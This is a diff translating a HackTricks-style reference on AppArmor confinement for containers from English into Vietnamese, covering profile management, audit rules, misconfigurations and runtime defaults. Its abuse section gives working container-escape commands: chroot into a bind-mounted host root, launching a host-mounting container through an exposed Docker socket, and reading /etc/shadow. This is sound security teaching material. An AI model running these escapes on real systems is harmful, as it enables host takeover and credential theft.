@@ -2,57 +2,57 @@
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
-## Overview
+## Tổng quan
 
-AppArmor is a **Mandatory Access Control** system that applies restrictions through per-program profiles. Unlike traditional DAC checks, which depend heavily on user and group ownership, AppArmor lets the kernel enforce a policy attached to the process itself. In container environments, this matters because a workload may have enough traditional privilege to attempt an action and still be denied because its AppArmor profile does not allow the relevant path, mount, network behavior, or capability use.
+AppArmor là hệ thống **Mandatory Access Control** áp dụng các hạn chế thông qua profile riêng cho từng chương trình. Khác với các kiểm tra DAC truyền thống, vốn phụ thuộc nhiều vào quyền sở hữu của người dùng và nhóm, AppArmor cho phép kernel thực thi chính sách gắn với chính tiến trình đó. Trong môi trường container, điều này rất quan trọng vì workload có thể có đủ quyền truyền thống để thử thực hiện một hành động nhưng vẫn bị từ chối vì profile AppArmor không cho phép truy cập đường dẫn, mount, hành vi mạng hoặc sử dụng capability liên quan.
 
-The most important conceptual point is that AppArmor is **path-based**. It reasons about filesystem access through path rules rather than through labels as SELinux does. That makes it approachable and powerful, but it also means bind mounts and alternate path layouts deserve careful attention. If the same host content becomes reachable under a different path, the effect of the policy may not be what the operator first expected.
+Điểm quan trọng nhất về mặt khái niệm là AppArmor **dựa trên đường dẫn**. Nó xét quyền truy cập filesystem thông qua các quy tắc đường dẫn thay vì thông qua nhãn như SELinux. Cách này dễ tiếp cận và mạnh mẽ, nhưng cũng đồng nghĩa với việc cần chú ý kỹ đến bind mount và các cách bố trí đường dẫn thay thế. Nếu cùng một nội dung trên host có thể được truy cập qua một đường dẫn khác, tác động của chính sách có thể không giống như điều người vận hành dự tính ban đầu.
 
-## Role In Container Isolation
+## Vai trò trong việc cô lập container
 
-Container security reviews often stop at capabilities and seccomp, but AppArmor continues to matter after those checks. Imagine a container that has more privilege than it should, or a workload that needed one extra capability for operational reasons. AppArmor can still constrain file access, mount behavior, networking, and execution patterns in ways that stop the obvious abuse path. This is why disabling AppArmor "just to get the application working" can quietly transform a merely risky configuration into one that is actively exploitable.
+Các bài đánh giá bảo mật container thường chỉ dừng lại ở capabilities và seccomp, nhưng AppArmor vẫn có vai trò sau những bước kiểm tra đó. Hãy hình dung một container có nhiều quyền hơn mức cần thiết, hoặc một workload cần thêm một capability vì lý do vận hành. AppArmor vẫn có thể giới hạn quyền truy cập file, hành vi mount, mạng và các kiểu thực thi để ngăn chặn những con đường lạm dụng rõ ràng. Vì vậy, việc tắt AppArmor "chỉ để ứng dụng chạy được" có thể âm thầm biến một cấu hình vốn chỉ tiềm ẩn rủi ro thành cấu hình có thể bị khai thác trực tiếp.
 
 ## Lab
 
-To check whether AppArmor is active on the host, use:
+Để kiểm tra AppArmor có đang hoạt động trên host hay không, hãy dùng:
 
 ```bash
 aa-status 2>/dev/null || apparmor_status 2>/dev/null
 cat /sys/module/apparmor/parameters/enabled 2>/dev/null
 ```
 
-To see what the current container process is running under:
+Để xem tiến trình container hiện tại đang chạy dưới quyền nào:
 
 ```bash
 docker run --rm ubuntu:24.04 cat /proc/self/attr/current
 docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
 ```
 
-The difference is instructive. In the normal case, the process should show an AppArmor context tied to the profile chosen by the runtime. In the unconfined case, that extra restriction layer disappears.
+Sự khác biệt này rất đáng lưu ý. Trong trường hợp bình thường, tiến trình sẽ hiển thị ngữ cảnh AppArmor gắn với profile do runtime chọn. Trong trường hợp không bị giới hạn, lớp hạn chế bổ sung đó sẽ biến mất.
 
-You can also inspect what Docker thinks it applied:
+Bạn cũng có thể kiểm tra những gì Docker cho rằng nó đã áp dụng:
 
 ```bash
 docker inspect <container> | jq '.[0].AppArmorProfile'
 ```
 
-## Runtime Usage
+## Cách sử dụng khi chạy
 
-Docker can apply a default or custom AppArmor profile when the host supports it. Podman can also integrate with AppArmor on AppArmor-based systems, although on SELinux-first distributions the other MAC system often takes center stage. Kubernetes can expose AppArmor policy at the workload level on nodes that actually support AppArmor. LXC and related Ubuntu-family system-container environments also use AppArmor extensively.
+Docker có thể áp dụng profile AppArmor mặc định hoặc tùy chỉnh khi host hỗ trợ. Podman cũng có thể tích hợp với AppArmor trên các hệ thống sử dụng AppArmor, mặc dù trên các bản phân phối ưu tiên SELinux, hệ thống MAC còn lại thường đóng vai trò chính. Kubernetes có thể áp dụng policy AppArmor ở cấp workload trên các node thực sự hỗ trợ AppArmor. LXC và các môi trường system-container liên quan thuộc họ Ubuntu cũng sử dụng AppArmor rộng rãi.
 
-The practical point is that AppArmor is not a "Docker feature". It is a host-kernel feature that several runtimes can choose to apply. If the host does not support it or the runtime is told to run unconfined, the supposed protection is not really there.
+Điểm thực tế là AppArmor không phải là một "tính năng của Docker". Đây là tính năng của host-kernel mà một số runtime có thể chọn áp dụng. Nếu host không hỗ trợ hoặc runtime được cấu hình để chạy ở chế độ unconfined, thì lớp bảo vệ được cho là có sẽ không thực sự tồn tại.
 
-For Kubernetes specifically, the modern API is `securityContext.appArmorProfile`. Since Kubernetes `v1.30`, the older beta AppArmor annotations are deprecated. On supported hosts, `RuntimeDefault` is the default profile, while `Localhost` points at a profile that must already be loaded on the node. This matters during review because a manifest may look AppArmor-aware while still depending entirely on node-side support and preloaded profiles.<sup>[[1]](#references)</sup>
+Riêng với Kubernetes, API hiện đại là `securityContext.appArmorProfile`. Kể từ Kubernetes `v1.30`, các AppArmor annotation beta cũ đã bị deprecated. Trên các host được hỗ trợ, `RuntimeDefault` là profile mặc định, còn `Localhost` trỏ đến một profile phải được tải sẵn trên node. Điều này quan trọng khi đánh giá vì manifest có thể trông như đã cấu hình AppArmor nhưng vẫn phụ thuộc hoàn toàn vào hỗ trợ phía node và các profile được tải sẵn.<sup>[[1]](#references)</sup>
 
-One subtle but useful operational detail is that explicitly setting `appArmorProfile.type: RuntimeDefault` is stricter than simply omitting the field. If the field is explicitly set and the node does not support AppArmor, admission should fail. If the field is omitted, the workload may still run on a node without AppArmor and simply not receive that extra confinement layer. From an attacker's point of view, this is a good reason to check both the manifest and the actual node state.<sup>[[1]](#references)</sup>
+Một chi tiết vận hành tinh tế nhưng hữu ích là đặt rõ `appArmorProfile.type: RuntimeDefault` sẽ chặt chẽ hơn so với việc bỏ qua trường này. Nếu trường được đặt rõ ràng mà node không hỗ trợ AppArmor, quá trình admission sẽ thất bại. Nếu bỏ qua trường này, workload vẫn có thể chạy trên node không có AppArmor và đơn giản là không nhận thêm lớp giới hạn đó. Từ góc nhìn của attacker, đây là lý do nên kiểm tra cả manifest lẫn trạng thái thực tế của node.<sup>[[1]](#references)</sup>
 
-On Docker-capable AppArmor hosts, the best-known default is `docker-default`. That profile is generated from Moby's AppArmor template and is important because it explains why some capability-based PoCs still fail in a default container. In broad terms, `docker-default` allows ordinary networking, denies writes to much of `/proc`, denies access to sensitive parts of `/sys`, blocks mount operations, and restricts ptrace so that it is not a general host-probing primitive. Understanding that baseline helps distinguish "the container has `CAP_SYS_ADMIN`" from "the container can actually use that capability against the kernel interfaces I care about".
+Trên các host Docker hỗ trợ AppArmor, profile mặc định nổi tiếng nhất là `docker-default`. Profile này được tạo từ template AppArmor của Moby và rất quan trọng vì nó giải thích tại sao một số PoC dựa trên capability vẫn thất bại trong container mặc định. Nói chung, `docker-default` cho phép hoạt động mạng thông thường, từ chối ghi vào phần lớn `/proc`, từ chối truy cập các phần nhạy cảm của `/sys`, chặn thao tác mount và giới hạn ptrace để nó không trở thành một primitive dò xét host tổng quát. Hiểu rõ baseline này giúp phân biệt giữa "container có `CAP_SYS_ADMIN`" và "container thực sự có thể dùng capability đó trên các giao diện kernel mà tôi quan tâm".
 
-## Profile Management
+## Quản lý profile
 
-AppArmor profiles are usually stored under `/etc/apparmor.d/`. A common naming convention is to replace slashes in the executable path with dots. For example, a profile for `/usr/bin/man` is commonly stored as `/etc/apparmor.d/usr.bin.man`. This detail matters during both defense and assessment because once you know the active profile name, you can often locate the corresponding file quickly on the host.
+Các profile AppArmor thường được lưu trong `/etc/apparmor.d/`. Một quy ước đặt tên phổ biến là thay dấu gạch chéo trong đường dẫn executable bằng dấu chấm. Ví dụ, profile cho `/usr/bin/man` thường được lưu tại `/etc/apparmor.d/usr.bin.man`. Chi tiết này hữu ích khi phòng thủ cũng như đánh giá vì khi biết tên profile đang hoạt động, bạn thường có thể nhanh chóng tìm thấy file tương ứng trên host.
 
-Useful host-side management commands include:
+Các lệnh quản lý hữu ích ở phía host bao gồm:
 
 ```bash
 aa-status
@@ -64,80 +64,80 @@ aa-logprof
 aa-mergeprof
 ```
 
-The reason these commands matter in a container-security reference is that they explain how profiles are actually built, loaded, switched to complain mode, and modified after application changes. If an operator has a habit of moving profiles into complain mode during troubleshooting and forgetting to restore enforcement, the container may look protected in documentation while behaving much more loosely in reality.
+Lý do các lệnh này quan trọng trong tài liệu tham khảo về bảo mật container là chúng giải thích cách tạo profile, tải profile, chuyển sang complain mode và chỉnh sửa profile sau khi ứng dụng thay đổi. Nếu quản trị viên có thói quen chuyển profile sang complain mode khi khắc phục sự cố rồi quên bật lại chế độ enforcement, container có thể trông như được bảo vệ theo tài liệu nhưng thực tế lại hoạt động với mức hạn chế lỏng lẻo hơn nhiều.
 
-### Building And Updating Profiles
+### Tạo Và Cập Nhật Profile
 
-`aa-genprof` can observe application behavior and help generate a profile interactively:
+`aa-genprof` có thể theo dõi hành vi của ứng dụng và hỗ trợ tạo profile theo cách tương tác:
 
 ```bash
 sudo aa-genprof /path/to/binary
 /path/to/binary
 ```
 
-`aa-easyprof` can generate a template profile that can later be loaded with `apparmor_parser`:
+`aa-easyprof` có thể tạo một hồ sơ mẫu để sau này tải bằng `apparmor_parser`:
 
 ```bash
 sudo aa-easyprof /path/to/binary
 sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
 ```
 
-When the binary changes and the policy needs updating, `aa-logprof` can replay denials found in logs and assist the operator in deciding whether to allow or deny them:
+Khi binary thay đổi và policy cần được cập nhật, `aa-logprof` có thể phát lại các lần từ chối được ghi trong log và hỗ trợ người vận hành quyết định cho phép hay từ chối chúng:
 
 ```bash
 sudo aa-logprof
 ```
 
-### Logs
+### Nhật ký
 
-AppArmor denials are often visible through `auditd`, syslog, or tools such as `aa-notify`:
+Các lần từ chối của AppArmor thường hiển thị qua `auditd`, syslog hoặc các công cụ như `aa-notify`:
 
 ```bash
 sudo aa-notify -s 1 -v
 ```
 
-This is useful operationally and offensively. Defenders use it to refine profiles. Attackers use it to learn which exact path or operation is being denied and whether AppArmor is the control blocking an exploit chain.
+Điều này hữu ích về mặt vận hành và tấn công. Người phòng thủ dùng nó để tinh chỉnh các profile. Kẻ tấn công dùng nó để tìm hiểu chính xác đường dẫn hoặc thao tác nào đang bị từ chối, cũng như liệu AppArmor có phải là cơ chế kiểm soát đang chặn chuỗi khai thác hay không.
 
-### Identifying The Exact Profile File
+### Xác định chính xác tệp profile
 
-When a runtime shows a specific AppArmor profile name for a container, it is often useful to map that name back to the profile file on disk:
+Khi runtime hiển thị tên profile AppArmor cụ thể cho một container, việc ánh xạ tên đó về tệp profile trên đĩa thường rất hữu ích:
 
 ```bash
 docker inspect <container> | grep AppArmorProfile
 find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
 ```
 
-This is especially useful during host-side review because it bridges the gap between "the container says it is running under profile `lowpriv`" and "the actual rules live in this specific file that can be audited or reloaded".
+Điều này đặc biệt hữu ích khi rà soát từ phía host vì nó thu hẹp khoảng cách giữa “container cho biết nó đang chạy dưới profile `lowpriv`” và “các quy tắc thực tế nằm trong tệp cụ thể này, có thể được kiểm tra hoặc tải lại”.
 
-### High-Signal Rules To Audit
+### Các quy tắc quan trọng cần kiểm tra
 
-When you can read a profile, do not stop at simple `deny` lines. Several rule types materially change how useful AppArmor will be against a container escape attempt:<sup>[[2]](#references)</sup>
+Khi có thể đọc một profile, đừng chỉ dừng lại ở các dòng `deny` đơn giản. Một số loại quy tắc có thể ảnh hưởng đáng kể đến mức độ hữu ích của AppArmor trong việc chống lại nỗ lực thoát khỏi container:<sup>[[2]](#references)</sup>
 
-- `ux` / `Ux`: execute the target binary unconfined. If a reachable helper, shell, or interpreter is allowed under `ux`, that is usually the first thing to test.
-- `px` / `Px` and `cx` / `Cx`: perform profile transitions on exec. These are not automatically bad, but they are worth auditing because a transition may land in a much broader profile than the current one.
-- `change_profile`: allows a task to switch into another loaded profile, immediately or at next exec. If the destination profile is weaker, this can become the intended escape hatch out of a restrictive domain.
-- `flags=(complain)`, `flags=(unconfined)`, or newer `flags=(prompt)`: these should change how much trust you place in the profile. `complain` logs denials instead of enforcing them, `unconfined` removes the boundary, and `prompt` depends on a userspace decision path rather than pure kernel-enforced deny.
-- `userns` or `userns create,`: newer AppArmor policy can mediate creation of user namespaces. If a container profile explicitly allows it, nested user namespaces remain in play even when the platform uses AppArmor as part of its hardening strategy.
+- `ux` / `Ux`: thực thi binary đích mà không bị giới hạn. Nếu một helper, shell hoặc interpreter có thể truy cập được và được cho phép bằng `ux`, đây thường là điều đầu tiên cần kiểm tra.
+- `px` / `Px` và `cx` / `Cx`: thực hiện chuyển đổi profile khi exec. Những quy tắc này không mặc nhiên là xấu, nhưng đáng để kiểm tra vì việc chuyển đổi có thể đưa tiến trình vào một profile rộng hơn nhiều so với profile hiện tại.
+- `change_profile`: cho phép một task chuyển sang profile khác đã được tải, ngay lập tức hoặc ở lần exec tiếp theo. Nếu profile đích yếu hơn, đây có thể trở thành lối thoát được chủ ý tạo ra khỏi một domain hạn chế.
+- `flags=(complain)`, `flags=(unconfined)` hoặc `flags=(prompt)` mới hơn: các cờ này sẽ ảnh hưởng đến mức độ tin cậy bạn đặt vào profile. `complain` ghi log các lần từ chối thay vì thực thi chúng, `unconfined` loại bỏ ranh giới bảo vệ, còn `prompt` phụ thuộc vào quy trình quyết định ở userspace thay vì chỉ dựa vào cơ chế từ chối do kernel thực thi.
+- `userns` hoặc `userns create,`: các policy AppArmor mới hơn có thể kiểm soát việc tạo user namespace. Nếu profile container cho phép rõ ràng điều này, user namespace lồng nhau vẫn có thể được sử dụng ngay cả khi nền tảng dùng AppArmor như một phần trong chiến lược hardening.
 
-Useful host-side grep:
+Lệnh grep hữu ích từ phía host:
 
 ```bash
 grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
 ```
 
-This kind of audit is often more useful than staring at hundreds of ordinary file rules. If a breakout depends on executing a helper, entering a new namespace, or escaping into a less restrictive profile, the answer is often hidden in these transition-oriented rules rather than in the obvious `deny /etc/shadow r` style lines.
+Loại kiểm tra này thường hữu ích hơn nhiều so với việc xem hàng trăm quy tắc file thông thường. Nếu một breakout phụ thuộc vào việc thực thi một helper, vào một namespace mới hoặc thoát sang một profile ít hạn chế hơn, câu trả lời thường nằm trong các quy tắc thiên về chuyển đổi này, thay vì trong những dòng hiển nhiên như `deny /etc/shadow r`.
 
-## Misconfigurations
+## Cấu hình sai
 
-The most obvious mistake is `apparmor=unconfined`. Administrators often set it while debugging an application that failed because the profile correctly blocked something dangerous or unexpected. If the flag remains in production, the entire MAC layer has effectively been removed.
+Lỗi rõ ràng nhất là `apparmor=unconfined`. Quản trị viên thường đặt tùy chọn này khi debug một ứng dụng bị lỗi vì profile đã chặn đúng một thao tác nguy hiểm hoặc không mong muốn. Nếu cờ này vẫn được giữ trong môi trường production, toàn bộ lớp MAC về cơ bản đã bị vô hiệu hóa.
 
-Another subtle problem is assuming that bind mounts are harmless because the file permissions look normal. Since AppArmor is path-based, exposing host paths under alternate mount locations can interact badly with path rules. A third mistake is forgetting that a profile name in a config file means very little if the host kernel is not actually enforcing AppArmor.
+Một vấn đề tinh vi khác là cho rằng bind mount vô hại vì quyền truy cập file trông bình thường. Vì AppArmor dựa trên đường dẫn, việc để lộ các đường dẫn host ở những vị trí mount thay thế có thể tương tác không tốt với các quy tắc đường dẫn. Lỗi thứ ba là quên rằng tên profile trong file cấu hình hầu như không có ý nghĩa gì nếu kernel của host thực sự không thực thi AppArmor.
 
-## Abuse
+## Lạm dụng
 
-When AppArmor is gone, operations that were previously constrained may suddenly work: reading sensitive paths through bind mounts, accessing parts of procfs or sysfs that should have remained harder to use, performing mount-related actions if capabilities/seccomp also permit them, or using paths that a profile would normally deny. AppArmor is often the mechanism that explains why a capability-based breakout attempt "should work" on paper but still fails in practice. Remove AppArmor, and the same attempt may start succeeding.
+Khi AppArmor không còn, những thao tác trước đây bị hạn chế có thể đột nhiên thực hiện được: đọc các đường dẫn nhạy cảm thông qua bind mount, truy cập những phần của procfs hoặc sysfs vốn khó sử dụng hơn, thực hiện các thao tác liên quan đến mount nếu capabilities/seccomp cũng cho phép, hoặc dùng các đường dẫn mà profile thường sẽ chặn. AppArmor thường là cơ chế giải thích vì sao một nỗ lực breakout dựa trên capability “đáng lẽ phải hoạt động” trên lý thuyết nhưng thực tế vẫn thất bại. Loại bỏ AppArmor, và cùng nỗ lực đó có thể bắt đầu thành công.
 
-If you suspect AppArmor is the main thing stopping a path-traversal, bind-mount, or mount-based abuse chain, the first step is usually to compare what becomes accessible with and without a profile. For example, if a host path is mounted inside the container, start by checking whether you can traverse and read it:
+Nếu nghi ngờ AppArmor là yếu tố chính ngăn chặn một chuỗi lạm dụng dựa trên path-traversal, bind mount hoặc mount, bước đầu tiên thường là so sánh những gì có thể truy cập khi có và không có profile. Ví dụ, nếu một đường dẫn host được mount bên trong container, trước tiên hãy kiểm tra xem bạn có thể đi qua và đọc đường dẫn đó không:
 
 ```bash
 cat /proc/self/attr/current
@@ -145,7 +145,7 @@ find /host -maxdepth 2 -ls 2>/dev/null | head
 find /host/etc -maxdepth 1 -type f 2>/dev/null | head
 ```
 
-If the container also has a dangerous capability such as `CAP_SYS_ADMIN`, one of the most practical tests is whether AppArmor is the control blocking mount operations or access to sensitive kernel filesystems:
+Nếu container cũng có capability nguy hiểm như `CAP_SYS_ADMIN`, một trong những cách kiểm tra thiết thực nhất là xác định liệu AppArmor có phải là cơ chế kiểm soát đang chặn các thao tác mount hoặc truy cập vào các filesystem nhạy cảm của kernel hay không:
 
 ```bash
 capsh --print | grep cap_sys_admin
@@ -155,7 +155,7 @@ mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
 mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
 ```
 
-In environments where a host path is already available through a bind mount, losing AppArmor may also turn a read-only information-disclosure issue into direct host file access:
+Trong các môi trường mà đường dẫn trên host đã khả dụng thông qua bind mount, việc mất AppArmor cũng có thể biến một lỗi tiết lộ thông tin chỉ đọc thành khả năng truy cập trực tiếp các tệp trên host:
 
 ```bash
 ls -la /host/root 2>/dev/null
@@ -163,11 +163,11 @@ cat /host/etc/shadow 2>/dev/null | head
 find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
 ```
 
-The point of these commands is not that AppArmor alone creates the breakout. It is that once AppArmor is removed, many filesystem and mount-based abuse paths become testable immediately.
+Mục đích của các lệnh này không phải là AppArmor tự nó tạo ra lối thoát khỏi container. Mà là khi AppArmor bị gỡ bỏ, nhiều đường tấn công lạm dụng filesystem và mount có thể được kiểm tra ngay lập tức.
 
-### Full Example: AppArmor Disabled + Host Root Mounted
+### Ví dụ đầy đủ: AppArmor bị vô hiệu hóa + root của host được mount
 
-If the container already has the host root bind-mounted at `/host`, removing AppArmor can turn a blocked filesystem abuse path into a complete host escape:
+Nếu container đã có root của host được bind-mount tại `/host`, việc gỡ bỏ AppArmor có thể biến một đường tấn công lạm dụng filesystem vốn bị chặn thành lối thoát hoàn toàn khỏi host:
 
 ```bash
 cat /proc/self/attr/current
@@ -175,7 +175,7 @@ ls -la /host
 chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
 ```
 
-Once the shell is executing through the host filesystem, the workload has effectively escaped the container boundary:
+Khi shell thực thi thông qua hệ thống tệp của host, workload về cơ bản đã thoát khỏi ranh giới container:
 
 ```bash
 id
@@ -183,20 +183,20 @@ hostname
 cat /etc/shadow | head
 ```
 
-### Full Example: AppArmor Disabled + Runtime Socket
+### Ví dụ đầy đủ: AppArmor bị vô hiệu hóa + Socket của runtime
 
-If the real barrier was AppArmor around runtime state, a mounted socket can be enough for a complete escape:
+Nếu rào cản thực sự là AppArmor bảo vệ trạng thái runtime, thì một socket được mount có thể đủ để thoát hoàn toàn:
 
 ```bash
 find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
 docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
 ```
 
-The exact path depends on the mount point, but the end result is the same: AppArmor is no longer preventing access to the runtime API, and the runtime API can launch a host-compromising container.
+Đường dẫn chính xác phụ thuộc vào điểm mount, nhưng kết quả cuối cùng vẫn như nhau: AppArmor không còn ngăn cản việc truy cập runtime API, và runtime API có thể khởi chạy một container xâm phạm host.
 
-### Full Example: Path-Based Bind-Mount Bypass
+### Ví dụ đầy đủ: Bypass bind-mount dựa trên đường dẫn
 
-Because AppArmor is path-based, protecting `/proc/**` does not automatically protect the same host procfs content when it is reachable through a different path:
+Vì AppArmor dựa trên đường dẫn, việc bảo vệ `/proc/**` không tự động bảo vệ cùng nội dung procfs của host khi nội dung đó có thể được truy cập qua một đường dẫn khác:
 
 ```bash
 mount | grep '/host/proc'
@@ -204,11 +204,11 @@ find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
 cat /host/proc/sys/kernel/core_pattern 2>/dev/null
 ```
 
-The impact depends on what exactly is mounted and whether the alternate path also bypasses other controls, but this pattern is one of the clearest reasons AppArmor must be evaluated together with mount layout rather than in isolation.
+Tác động phụ thuộc vào chính xác những gì được mount và liệu đường dẫn thay thế có đồng thời vượt qua các biện pháp kiểm soát khác hay không, nhưng mô hình này là một trong những lý do rõ ràng nhất cho thấy AppArmor phải được đánh giá cùng với bố cục mount, thay vì tách biệt.
 
-### Full Example: Shebang Bypass
+### Ví dụ đầy đủ: Shebang Bypass
 
-AppArmor may attach a profile to the executed script path rather than the interpreter named by its shebang. Conversely, invoking the interpreter directly can select the interpreter's profile. An [AppArmor maintainer describes this distinction](https://bugs.launchpad.net/apparmor/+bug/1911431). A historical example involved a script whose first line points at a confined interpreter:
+AppArmor có thể gắn profile với đường dẫn của script được thực thi, thay vì với interpreter được chỉ định trong shebang. Ngược lại, gọi trực tiếp interpreter có thể chọn profile của interpreter đó. Một [người duy trì AppArmor mô tả sự khác biệt này](https://bugs.launchpad.net/apparmor/+bug/1911431). Một ví dụ lịch sử liên quan đến một script có dòng đầu tiên trỏ đến một interpreter bị giới hạn:
 
 ```bash
 cat <<'EOF' > /tmp/test.pl
@@ -221,11 +221,11 @@ chmod +x /tmp/test.pl
 /tmp/test.pl
 ```
 
-The example is only a candidate where the interpreter's file capability can become effective and the script's actual exec attachment permits the operation. Check the loaded policy and process label, the capability bounding set, `no_new_privs`, and the mount's `nosuid` state; a profile file name or `cap_setuid+ep` listing alone does not prove a usable transition. Interpreter chains and alternate execution paths deserve separate review.
+Ví dụ này chỉ là một trường hợp có thể xảy ra, trong đó capability trên file của interpreter có thể trở nên hiệu lực và attachment exec thực tế của script cho phép thao tác này. Hãy kiểm tra policy đã được tải và process label, capability bounding set, `no_new_privs` và trạng thái `nosuid` của mount; chỉ riêng tên file profile hoặc danh sách `cap_setuid+ep` không chứng minh rằng có thể thực hiện chuyển đổi. Cần xem xét riêng các chuỗi interpreter và những đường thực thi thay thế.
 
 ## Checks
 
-The goal of these checks is to answer three questions quickly: is AppArmor enabled on the host, is the current process confined, and did the runtime actually apply a profile to this container?
+Mục tiêu của các bước kiểm tra này là nhanh chóng trả lời ba câu hỏi: AppArmor có được bật trên host không, process hiện tại có bị giới hạn không và runtime có thực sự áp dụng profile cho container này không?
 
 ```bash
 cat /proc/self/attr/current                         # Current AppArmor label for this process
@@ -236,30 +236,29 @@ cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # L
 grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
 ```
 
-What is interesting here:
+Điều đáng chú ý ở đây:
 
-- If `/proc/self/attr/current` shows `unconfined`, the workload is not benefiting from AppArmor confinement.
-- If `aa-status` shows AppArmor disabled or not loaded, any profile name in the runtime config is mostly cosmetic.
-- If `docker inspect` shows `unconfined` or an unexpected custom profile, that is often the reason a filesystem or mount-based abuse path works.
-- If `/sys/kernel/security/apparmor/profiles` does not contain the profile you expected, the runtime or orchestrator configuration is not enough by itself.
-- If a supposedly hardened profile contains `ux`, broad `change_profile`, `userns`, or `flags=(complain)` style rules, the practical boundary may be much weaker than the profile name suggests.
+- Nếu `/proc/self/attr/current` hiển thị `unconfined`, workload không được hưởng cơ chế giới hạn của AppArmor.
+- Nếu `aa-status` cho biết AppArmor bị tắt hoặc chưa được tải, mọi tên profile trong cấu hình runtime hầu như chỉ mang tính hình thức.
+- Nếu `docker inspect` hiển thị `unconfined` hoặc một profile tùy chỉnh không mong đợi, đó thường là lý do khiến một đường khai thác dựa trên filesystem hoặc mount hoạt động.
+- Nếu `/sys/kernel/security/apparmor/profiles` không chứa profile bạn mong đợi, thì riêng cấu hình runtime hoặc orchestrator là chưa đủ.
+- Nếu một profile được cho là đã tăng cường bảo mật lại chứa các quy tắc kiểu `ux`, `change_profile` quá rộng, `userns` hoặc `flags=(complain)`, ranh giới bảo mật trên thực tế có thể yếu hơn nhiều so với tên profile gợi ý.
 
-If a container already has elevated privileges for operational reasons, leaving AppArmor enabled often makes the difference between a controlled exception and a much broader security failure.
+Nếu một container đã có đặc quyền cao vì lý do vận hành, việc giữ AppArmor bật thường tạo nên khác biệt giữa một ngoại lệ được kiểm soát và một sự cố bảo mật trên diện rộng hơn.
 
-## Runtime Defaults
+## Mặc định của runtime
 
-| Runtime / platform | Default state | Default behavior | Common manual weakening |
+| Runtime / nền tảng | Trạng thái mặc định | Hành vi mặc định | Cách làm suy yếu phổ biến khi cấu hình thủ công |
 | --- | --- | --- | --- |
-| Docker Engine | Enabled by default on AppArmor-capable hosts | Uses the `docker-default` AppArmor profile unless overridden | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
-| Podman | Host-dependent | AppArmor is supported through `--security-opt`, but the exact default is host/runtime dependent and less universal than Docker's documented `docker-default` profile | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
-| Kubernetes | Conditional default | If `appArmorProfile.type` is not specified, the default is `RuntimeDefault`, but it is only applied when AppArmor is enabled on the node | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` with a weak profile, nodes without AppArmor support |
-| containerd / CRI-O under Kubernetes | Follows node/runtime support | Common Kubernetes-supported runtimes support AppArmor, but actual enforcement still depends on node support and workload settings | Same as Kubernetes row; direct runtime configuration can also skip AppArmor entirely |
+| Docker Engine | Được bật mặc định trên các host hỗ trợ AppArmor | Sử dụng profile AppArmor `docker-default` trừ khi bị ghi đè | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
+| Podman | Phụ thuộc vào host | AppArmor được hỗ trợ thông qua `--security-opt`, nhưng mặc định cụ thể phụ thuộc vào host/runtime và không phổ biến như profile `docker-default` được Docker ghi nhận | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
+| Kubernetes | Mặc định có điều kiện | Nếu không chỉ định `appArmorProfile.type`, giá trị mặc định là `RuntimeDefault`, nhưng chỉ được áp dụng khi AppArmor được bật trên node | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` với profile yếu, các node không hỗ trợ AppArmor |
+| containerd / CRI-O trong Kubernetes | Phụ thuộc vào hỗ trợ của node/runtime | Các runtime phổ biến được Kubernetes hỗ trợ có hỗ trợ AppArmor, nhưng việc thực thi thực tế vẫn phụ thuộc vào hỗ trợ của node và cấu hình workload | Như hàng Kubernetes; cấu hình runtime trực tiếp cũng có thể bỏ qua AppArmor hoàn toàn |
 
-For AppArmor, the most important variable is often the **host**, not only the runtime. A profile setting in a manifest does not create confinement on a node where AppArmor is not enabled.
+Với AppArmor, biến số quan trọng nhất thường là **host**, chứ không chỉ là runtime. Thiết lập profile trong manifest không tạo ra cơ chế giới hạn trên một node chưa bật AppArmor.
 
 ## References
 
-- [1] [Kubernetes security context: AppArmor profile fields and node-support behavior](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
-- [2] [Ubuntu 24.04 `apparmor.d(5)` manpage: exec transitions, `change_profile`, `userns`, and profile flags](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
-
+- [1] [Ngữ cảnh bảo mật Kubernetes: các trường profile AppArmor và hành vi hỗ trợ của node](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
+- [2] [Trang hướng dẫn `apparmor.d(5)` của Ubuntu 24.04: chuyển tiếp khi thực thi, `change_profile`, `userns` và các cờ profile](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
 {{#include ../../../../banners/hacktricks-training.md}}
